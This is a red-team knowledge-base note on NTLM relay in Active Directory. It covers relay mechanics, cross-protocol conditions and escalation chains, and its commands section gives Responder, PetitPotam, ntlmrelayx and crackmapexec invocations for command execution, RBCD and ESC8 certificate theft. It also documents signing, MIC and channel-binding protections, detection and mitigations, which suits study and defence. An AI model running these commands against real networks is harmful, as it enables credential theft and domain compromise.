---
title: NTLM Relay
aliases: ["NTLM relay", "ntlmrelayx", "SMB relay"]
type: technique
domain: [red-team]
attack_tactic: [credential-access, lateral-movement, privesc]
tags: [type/technique, domain/red-team, attack/credential-access, proto/ntlm]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[NTLM Authentication]]", "[[NetNTLM]]", "[[LLMNR-NBT-NS Poisoning]]", "[[WPAD and IPv6 (mitm6) Poisoning]]", "[[PetitPotam]]", "[[AD Certificate Services Abuse (ESC1-ESC8)]]", "[[Responder]]", "[[ntlmrelayx]]", "[[SMB]]"]
created: 2026-06-06
updated: 2026-06-07
---

# NTLM Relay

> [!summary] One-liner
> Instead of cracking captured [[NetNTLM]] hashes, forward the NTLM exchange live to another service and authenticate there as the victim — no password cracking needed.

## Concept abused
[[NTLM Authentication]] doesn't bind the auth to a specific connection (unless protected), so an attacker-in-the-middle can **relay** the client's NEGOTIATE/CHALLENGE/AUTHENTICATE messages to a *different* target service and be accepted as the victim. This works because NTLM messages are **opaque tokens** — the application protocol (SMB, HTTP, LDAP) embeds them without understanding their contents, and [[SSPI and SSPs|SSPI/NTLMSSP]] abstracts the authentication from the session layer.

### Authentication layer vs. session layer
This is the key insight: NTLM authentication and the application session are **independent layers**. The same NTLM exchange can authenticate for different protocols because the messages are protocol-agnostic blobs. This architecture enables cross-protocol relay.

## How the attack works
```
Victim                     Attacker                    Target
  │                           │                           │
  ├── NEGOTIATE ─────────────►│                           │
  │                           ├── NEGOTIATE ─────────────►│
  │                           │◄── CHALLENGE ─────────────┤
  │◄── CHALLENGE (same) ──────┤                           │
  ├── AUTHENTICATE ──────────►│                           │
  │                           ├── AUTHENTICATE ──────────►│
  │                           │◄── SUCCESS ───────────────┤
  │                           │  (attacker now has an     │
  │                           │   authenticated session)  │
```

The challenge value is **identical** in both legs — the attacker passes it through unchanged. The victim computes a valid response, which the attacker relays to the target.

## Prerequisites
- A way to **coerce/capture** victim auth: [[LLMNR-NBT-NS Poisoning]], [[WPAD and IPv6 (mitm6) Poisoning]], [[PetitPotam]], PrinterBug.
- A target service **without relay protections** (no required signing / no EPA).
- The victim account has useful rights on the target.

## Cross-protocol relay matrix

| Source → Target | Works? | Condition |
|---|---|---|
| **SMB → SMB** | Yes | Target doesn't **require** SMB signing |
| **SMB → LDAP** | **No** | SMB sets `NEGOTIATE_SIGN` flag → LDAP enforces signing |
| **SMB → LDAPS** | **No** | Channel binding (CBT) blocks it |
| **HTTP → SMB** | Yes | Target doesn't require signing (HTTP doesn't set signing flags) |
| **HTTP → LDAP** | Yes | HTTP doesn't set `NEGOTIATE_SIGN` |
| **HTTP → LDAPS** | **No** | Channel binding blocks it |

**General rule**: Relay succeeds only when the target protocol's security requirements don't conflict with the flags the client embedded in its NTLM response.

## High-value relay chains

| Chain | Impact |
|---|---|
| Coerce DC → relay to **LDAP** | Grant yourself [[DCSync]] rights or set [[Resource-Based Constrained Delegation (RBCD)|RBCD]] |
| Coerce DC → relay to **AD CS HTTP enrollment** | Get a cert as the DC ([[AD Certificate Services Abuse (ESC1-ESC8)|ESC8]]) → DCSync |
| Poisoning → relay to **SMB** | Remote code execution, SAM dump |

## Commands & tools
```bash
# 1) Capture/coerce (disable Responder's SMB/HTTP so ntlmrelayx can listen)
# Edit Responder.conf: SMB = Off, HTTP = Off
sudo responder -I eth0

# Or coerce a DC (no Responder needed)
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# 2) Relay to SMB (command execution)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# 3) Relay to LDAP (set RBCD)
ntlmrelayx.py -t ldap://<DC> --delegate-access --escalate-user <CONTROLLED_USER>

# 4) Relay to AD CS (ESC8 — get DC certificate)
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 5) SOCKs mode (keep sessions open)
ntlmrelayx.py -t smb://<TARGET> -smb2support -socks
```

## Relay protections (in depth)

### SMB signing

| Client \ Server | Disabled | Enabled | Required |
|---|---|---|---|
| **Disabled** | No signing | Negotiated | Signing enforced |
| **Enabled** | No signing | Negotiated (SMBv2+: signed) | Signing enforced |
| **Required** | Signing enforced | Signing enforced | Signing enforced |

- **Default**: DCs **require** signing; member servers/workstations have it **enabled but not required**.
- If signing is not required, the attacker forwards messages without modification. If required, the attacker cannot sign (lacks the session key derived from the victim's secret) → relay fails.

```bash
# Find targets that don't require signing
crackmapexec smb 10.0.0.0/24 --gen-relay-list unsigned.txt
```

### Message Integrity Code (MIC)
An HMAC-MD5 computed over all three NTLM messages (NEGOTIATE + CHALLENGE + AUTHENTICATE):
```
MIC = HMAC_MD5(SessionKey, NEGOTIATE || CHALLENGE || AUTHENTICATE)
```
- Placed in the final AUTHENTICATE message.
- The `msAvFlags` field (value `0x00000002`) signals MIC presence is mandatory.
- **Protection chain**: MIC protects all messages → `msAvFlags` protects MIC presence → NTLMv2 hash protects `msAvFlags` (it's included in the hash computation). Modifying any component breaks the chain.
- An attacker cannot strip the MIC without recalculating the NTLMv2 hash, which requires the victim's NT hash.

### Extended Protection for Authentication (EPA)

**Service binding (SPN binding)**: The client embeds the target service name (SPN) in the NTLM response, protected by `NtProofStr`. A relay to a different service has a mismatched SPN → the target server rejects it.

**TLS channel binding (CBT)**: When the target uses TLS (LDAPS, HTTPS):
1. Client computes a hash of the server's TLS certificate → Channel Binding Token (CBT).
2. CBT is embedded in the NTLM AUTHENTICATE message, protected by `NtProofStr`.
3. The legitimate server hashes its own certificate and compares → mismatch = relay detected.
4. The attacker's TLS certificate produces a different hash → relay to LDAPS/HTTPS fails.

### NTLMv1 — all protections fail
With NTLMv1, the response hash only considers the challenge — **not** `msAvFlags`, target hostname, SPN, or CBT. This means:
- MIC can be stripped (nothing protects its presence).
- SPN binding is absent.
- Channel binding is absent.
- The attacker can relay to LDAP, LDAPS, or any protocol without restriction.

> [!danger] NTLMv1 must be disabled
> NTLMv1 is architecturally broken for relay protection. There is no design fix — disable it entirely (`LMCompatibilityLevel ≥ 3`).

### CVE-2015-0005 — session key leak
Pre-patch, when a server called the DC's NETLOGON service to verify NTLM auth and obtain the session key, the DC didn't check whether the requesting server was the intended target. An attacker relaying NTLM could request the session key from the DC and use it to sign packets, bypassing signing protections. Post-patch, the DC verifies the requesting server's hostname matches the target embedded in the NTLM response.

## Detection / artifacts
- Authentication arriving for one host but sourced from another IP.
- Coercion traffic: MS-EFSR (PetitPotam), MS-RPRN (PrinterBug) RPC calls from unexpected sources.
- ntlmrelayx patterns: service creation, SAM dump, LDAP modifications following a relayed auth.
- Certificate enrollment for unexpected accounts (ESC8 chain).
- Event 4624 with unusual source/target combinations.

## Mitigation (priority order)
1. **Disable NTLMv1** — `LMCompatibilityLevel ≥ 3` (eliminates the worst relay scenarios).
2. **Require SMB signing** everywhere — `RequireSecuritySignature = 1` (blocks SMB relay).
3. **Enable LDAP signing** — maintain `ldapserverintegrity = 1` on DCs (default).
4. **Enable EPA / channel binding** — on AD CS web enrollment, LDAPS, all HTTPS services.
5. **Disable NTLM entirely** where possible — force [[Kerberos]] authentication.
6. **Disable LLMNR/NBT-NS** — removes the primary capture vector.
7. **Network segmentation** — prevent MITM positioning.

## Related
- Capture tools: [[Responder]], [[Inveigh]].
- Relay tool: [[ntlmrelayx]].
- Coercion: [[PetitPotam]], [[PrintNightmare]] (SpoolSample).
- Escalation target: [[AD Certificate Services Abuse (ESC1-ESC8)]] (ESC8), [[Resource-Based Constrained Delegation (RBCD)]].
- Protocol: [[NTLM Authentication]], [[NetNTLM]], [[SMB]].

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "NTLM Relay" / "NTLM Relay Protections"
- [[Source - hackndo blog]] — "NTLM Relay" — https://en.hackndo.com/ntlm-relay/
